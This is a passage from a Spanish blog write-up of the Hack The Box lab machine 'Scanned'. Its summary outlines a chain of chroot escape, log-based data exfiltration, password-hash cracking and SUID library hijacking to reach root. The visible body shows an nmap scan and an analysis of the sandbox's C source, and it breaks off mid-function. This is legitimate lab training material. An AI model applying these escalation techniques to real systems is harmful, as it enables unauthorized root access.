<!doctype html><html lang="es"><head><title>Scanned | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Máquina insana. Esta máquina tiene una página web que es capaz de analizar malware. Al analizar el código en C del sandbox, se ve que se puede utilizar un archivo de log para exfiltrar información por medio del servidor web, y también abusar de una mala configuración para escapar de chroot. Luego, podemos leer una base de datos SQLite y extraer el hash de una contraseña, que se reutiliza para SSH. Una vez en la máquina, se puede ejecutar un binario SUID desde la sandbox y copiar una librería compartida maliciosa para que el binario SUID ejecute Bash como root. Para comprometer esta máquina se necesitan conocimientos avanzados de Linux, programación en C y Bash, experiencia en auditoría de código y técnicas de evasión. En este write-up se utiliza un script en Bash con un programa en C embebido para listar directorios y leer archivos del servidor y también un programa en Go para romper el hash de una contraseña"><meta itemprop="description" content="Hack The Box. Linux. Máquina insana. Esta máquina tiene una página web que es capaz de analizar malware. Al analizar el código en C del sandbox, se ve que se puede utilizar un archivo de log para exfiltrar información por medio del servidor web, y también abusar de una mala configuración para escapar de chroot. Luego, podemos leer una base de datos SQLite y extraer el hash de una contraseña, que se reutiliza para SSH. Una vez en la máquina, se puede ejecutar un binario SUID desde la sandbox y copiar una librería compartida maliciosa para que el binario SUID ejecute Bash como root. Para comprometer esta máquina se necesitan conocimientos avanzados de Linux, programación en C y Bash, experiencia en auditoría de código y técnicas de evasión. En este write-up se utiliza un script en Bash con un programa en C embebido para listar directorios y leer archivos del servidor y también un programa en Go para romper el hash de una contraseña"><meta name="twitter:card" content="Hack The Box. Linux. Máquina insana. Esta máquina tiene una página web que es capaz de analizar malware. Al analizar el código en C del sandbox, se ve que se puede utilizar un archivo de log para exfiltrar información por medio del servidor web, y también abusar de una mala configuración para escapar de chroot. Luego, podemos leer una base de datos SQLite y extraer el hash de una contraseña, que se reutiliza para SSH. Una vez en la máquina, se puede ejecutar un binario SUID desde la sandbox y copiar una librería compartida maliciosa para que el binario SUID ejecute Bash como root. Para comprometer esta máquina se necesitan conocimientos avanzados de Linux, programación en C y Bash, experiencia en auditoría de código y técnicas de evasión. En este write-up se utiliza un script en Bash con un programa en C embebido para listar directorios y leer archivos del servidor y también un programa en Go para romper el hash de una contraseña"><meta name="twitter:description" content="Hack The Box. Linux. Máquina insana. Esta máquina tiene una página web que es capaz de analizar malware. Al analizar el código en C del sandbox, se ve que se puede utilizar un archivo de log para exfiltrar información por medio del servidor web, y también abusar de una mala configuración para escapar de chroot. Luego, podemos leer una base de datos SQLite y extraer el hash de una contraseña, que se reutiliza para SSH. Una vez en la máquina, se puede ejecutar un binario SUID desde la sandbox y copiar una librería compartida maliciosa para que el binario SUID ejecute Bash como root. Para comprometer esta máquina se necesitan conocimientos avanzados de Linux, programación en C y Bash, experiencia en auditoría de código y técnicas de evasión. En este write-up se utiliza un script en Bash con un programa en C embebido para listar directorios y leer archivos del servidor y también un programa en Go para romper el hash de una contraseña"><meta property="og:description" content="Hack The Box. Linux. Máquina insana. Esta máquina tiene una página web que es capaz de analizar malware. Al analizar el código en C del sandbox, se ve que se puede utilizar un archivo de log para exfiltrar información por medio del servidor web, y también abusar de una mala configuración para escapar de chroot. Luego, podemos leer una base de datos SQLite y extraer el hash de una contraseña, que se reutiliza para SSH. Una vez en la máquina, se puede ejecutar un binario SUID desde la sandbox y copiar una librería compartida maliciosa para que el binario SUID ejecute Bash como root. Para comprometer esta máquina se necesitan conocimientos avanzados de Linux, programación en C y Bash, experiencia en auditoría de código y técnicas de evasión. En este write-up se utiliza un script en Bash con un programa en C embebido para listar directorios y leer archivos del servidor y también un programa en Go para romper el hash de una contraseña"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/HTB/Scanned/Scanned.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Scanned/Scanned.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Scanned/Scanned.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="Scanned"><meta property="twitter:title" content="Scanned"><meta property="og:title" content="Scanned"><meta property="og:url" content="https://7rocky.github.io/htb/scanned/"><meta itemprop="keywords" content="django,capabilities,suid,library-hijacking,race-condition,sandbox-escape,binary-exploitation,directory-path-traversal,password-reuse,hash-cracking,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/scanned/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/scanned/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/scanned/&text=Scanned" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/scanned/&title=Scanned" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Scanned</h1><time class="mt4 f6 dib tracked" datetime="2022-09-10T00:00:00+01:00">10 / 09 / 2022</time><br><p class="mb4 f6 dib tracked">20 minutos de lectura</p></header><div class="htb-image"><img alt="Scanned" src="/images/HTB/Scanned/Scanned.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/django" title="Django">Django</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/capabilities" title="Capabilities">Capabilities</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/suid" title="Binario SUID">Binario SUID</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/library-hijacking" title="Library Hijacking">Library Hijacking</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/race-condition" title="Condición de carrera">Condición de carrera</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sandbox-escape" title="Escapada de sandbox">Escapada de sandbox</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/binary-exploitation" title="Explotación de binarios">Explotación de binarios</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/directory-path-traversal" title="Navegación de directorios">Navegación de directorios</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilización de contraseñas">Reutilización de contraseñas</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/hash-cracking" title="Descifrado de hashes de contraseñas">Descifrado de hashes de contraseñas</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración-web">Enumeración web</a></li><li><a href="#análisis-del-código-de-la-_sandbox_">Análisis del código de la <em>sandbox</em></a></li><li><a href="#análisis-de-la-aplicación-web">Análisis de la aplicación web</a></li><li><a href="#abusando-de-malas-configuraciones">Abusando de malas configuraciones</a></li><li><a href="#intrusión-en-la-máquina">Intrusión en la máquina</a></li><li><a href="#_library-hijacking_"><em>Library Hijacking</em></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Insana</li><li><strong>Dirección IP</strong>: 10.10.11.141</li><li><strong>Fecha</strong>: 29 / 01 / 2022</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.141 -p 22,80
Nmap scan report for 10.10.11.141
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 6a:7b:14:68:97:01:4a:08:6a:e1:37:b1:d2:bd:8f:3f (RSA)
|   256 f6:b4:e1:10:f0:7b:38:48:66:34:c2:c6:28:ff:b8:25 (ECDSA)
|_  256 c9:8b:96:19:51:e7:ce:1f:7d:3e:44:e9:a4:04:91:09 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Malware Scanner
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 10.60 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).</p><h2 id="enumeración-web">Enumeración web</h2><p>Si vamos a <code>http://10.10.11.141</code>, veremos una página web como esta:</p><p><img src="/images/HTB/Scanned/Scanned-index.png" alt="Scanned index"></p><p>Nos dice que han desarrollado una <em>sandbox</em> segura que utiliza <code>chroot</code>, espacios de nombre de usuario y <code>ptrace</code>. Tenemos otra página en la que subir un binario con <em>malware</em>:</p><p><img src="/images/HTB/Scanned/Scanned-upload.png" alt="Scanned upload"></p><p>Solo por probar, vamos a compilar un programa sencillo en C como este:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span> <span class="mtk4">&lt;stdio.h&gt;</span>

<span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Hello,</span> <span class="mtk4">World!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>  
  <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gcc</span> <span class="mtku">hello.c</span> -o hello  
</code></pre></div><p>Lo subimos y veremos este reporte de llamadas de sistema usadas por el binario:</p><p><img src="/images/HTB/Scanned/Scanned-report-test.png" alt="Scanned report"></p><p>En este punto tenemos que analizar el código fuente de la <em>sandbox</em> y de la aplicación web.</p><h2 id="análisis-del-código-de-la-_sandbox_">Análisis del código de la <em>sandbox</em></h2><p>Esta es la función <code>main</code> del programa:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class="mtk1">,</span> <span class="mtk7 mtki">char</span><span class="mtk5">**</span> <span class="mtk9 mtki">argv</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk9 mtki">argc</span> <span class="mtk5">&lt;</span> <span class="mtk6">2</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Usage:</span> <span class="mtk6">%s</span> <span class="mtk4">&lt;program&gt;</span> <span class="mtk4">[uuid]</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk9 mtki">argv</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]);</span>  
        <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">-</span><span class="mtk6">2</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">strlen</span><span class="mtk1">(</span><span class="mtk9 mtki">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">])</span> <span class="mtk5">&gt;</span> <span class="mtk8">FILENAME_MAX</span> <span class="mtk5">-</span> <span class="mtk6">50</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk8">DIE</span><span class="mtk1">(</span><span class="mtk4">"Program</span> <span class="mtk4">name</span> <span class="mtk4">too</span> <span class="mtk4">long"</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>
    <span class="mtk5">if</span> <span class="mtk1">((</span><span class="mtk9 mtki">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">][</span><span class="mtk6">0</span><span class="mtk1">])</span> <span class="mtk5">!=</span> <span class="mtk4">'/'</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk8">DIE</span><span class="mtk1">(</span><span class="mtk4">"Program</span> <span class="mtk4">path</span> <span class="mtk4">must</span> <span class="mtk4">be</span> <span class="mtk4">absolute"</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>
    <span class="mtk8">umask</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
    <span class="mtk8">check_caps</span><span class="mtk1">();</span>
    <span class="mtk7 mtki">int</span> <span class="mtk1">result</span> <span class="mtk5">=</span> <span class="mtk8">mkdir</span><span class="mtk1">(</span><span class="mtk4">"jails"</span><span class="mtk1">,</span> <span class="mtk5">0</span><span class="mtk6">771</span><span class="mtk1">);</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk1">result</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span> <span class="mtk5">&amp;&amp;</span> <span class="mtk8">errno</span> <span class="mtk5">!=</span> <span class="mtk8">EEXIST</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk8">DIE</span><span class="mtk1">(</span> <span class="mtk4">"Could</span> <span class="mtk4">not</span> <span class="mtk4">create</span> <span class="mtk4">jail</span> <span class="mtk4">directory"</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>
    <span class="mtk7 mtki">char</span> <span class="mtk1">uuid</span><span class="mtk1">[</span><span class="mtk6">33</span><span class="mtk1">]</span> <span class="mtk5">=</span> <span class="mtk1">{</span><span class="mtk6">0</span><span class="mtk1">};</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk9 mtki">argc</span> <span class="mtk5">&lt;</span> <span class="mtk6">3</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk8">generate_uuid</span><span class="mtk1">(</span><span class="mtk1">uuid</span><span class="mtk1">);</span>
    <span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
        <span class="mtk8">memcpy</span><span class="mtk1">(</span><span class="mtk1">uuid</span><span class="mtk1">,</span> <span class="mtk9 mtki">argv</span><span class="mtk1">[</span><span class="mtk6">2</span><span class="mtk1">],</span> <span class="mtk6">32</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>
    <span class="mtk1">uuid</span><span class="mtk1">[</span><span class="mtk6">32</span><span class="mtk1">]</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
    <span class="mtk8">make_jail</span><span class="mtk1">(</span><span class="mtk1">uuid</span><span class="mtk1">,</span> <span class="mtk9 mtki">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">]);</span>
<span class="mtk1">}</span>
</code></pre></div><p>La primera comprobación es que el binario <code>sandbox</code> tenga suficientes <em>capabilities</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">check_caps</span><span class="mtk1">()</span> <span class="mtk1">{</span>
    <span class="mtk7 mtki">struct</span> <span class="mtk8 mtku">user_cap_header_struct</span> <span class="mtk1">header</span><span class="mtk1">;</span>
    <span class="mtk7 mtki">struct</span> <span class="mtk8 mtku">user_cap_data_struct</span> <span class="mtk1">caps</span><span class="mtk1">;</span>
    <span class="mtk7 mtki">char</span> <span class="mtk1">pad</span><span class="mtk1">[</span><span class="mtk6">32</span><span class="mtk1">];</span>
    <span class="mtk1">header</span><span class="mtk1">.</span><span class="mtk1">version</span> <span class="mtk5">=</span> <span class="mtk1">_LINUX_CAPABILITY_VERSION_3;</span>
    <span class="mtk1">header</span><span class="mtk1">.</span><span class="mtk1">pid</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
    <span class="mtk1">caps</span><span class="mtk1">.</span><span class="mtk1">effective</span> <span class="mtk5">=</span> <span class="mtk1">caps</span><span class="mtk1">.</span><span class="mtk1">inheritable</span> <span class="mtk5">=</span> <span class="mtk1">caps</span><span class="mtk1">.</span><span class="mtk1">permitted</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>  
    <span class="mtk8">syscall</span><span class="mtk1">(SYS_capget,</span> <span class="mtk5">&amp;</span><span class="mtk1">header</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">caps</span><span class="mtk1">);</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk1">(</span><span class="mtk1">caps</span><span class="mtk1">.</span><span class="mtk1">effective</span> <span class="mtk5">&amp;</span> <span class="mtk5">0x</span><span class="mtk6">2401c0</span><span class="mtk1">))</span> <span class="mtk1">{</span>
        <span class="mtk8">DIE</span><span class="mtk1">(</span><span class="mtk4">"Insufficient</span> <span class="mtk4">capabilities"</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>
<span class="mtk1">}</span>
</code></pre></div><p>Podemos usar <code>capsh</code> para decodificar la representación hexadecimal de <code>0x2401c0</code> a nombres de <em>capabilities</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">capsh</span> --decode=0x2401c0
0x00000000002401c0=cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,cap_sys_admin  
</code></pre></div><p>Vemos que el binario tiene esas <em>capabilities</em>, que son muy interesantes.</p><p>Luego, hace algunas configuraciones en el sistema de archivos y finalmente llama a <code>make_jail</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">make_jail</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk5">*</span> <span class="mtk9 mtki">name</span><span class="mtk1">,</span> <span class="mtk7 mtki">char</span><span class="mtk5">*</span> <span class="mtk9 mtki">program</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">jailsfd</span> <span class="mtk5">=</span> <span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"jails"</span><span class="mtk1">,</span> <span class="mtk8">O_RDONLY</span><span class="mtk5">|</span><span class="mtk1">__O_DIRECTORY);</span>  
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">faccessat</span><span class="mtk1">(</span><span class="mtk1">jailsfd</span><span class="mtk1">,</span> <span class="mtk9 mtki">name</span><span class="mtk1">,</span> <span class="mtk8">F_OK</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk8">DIE</span><span class="mtk1">(</span><span class="mtk4">"Jail</span> <span class="mtk4">name</span> <span class="mtk4">exists"</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>
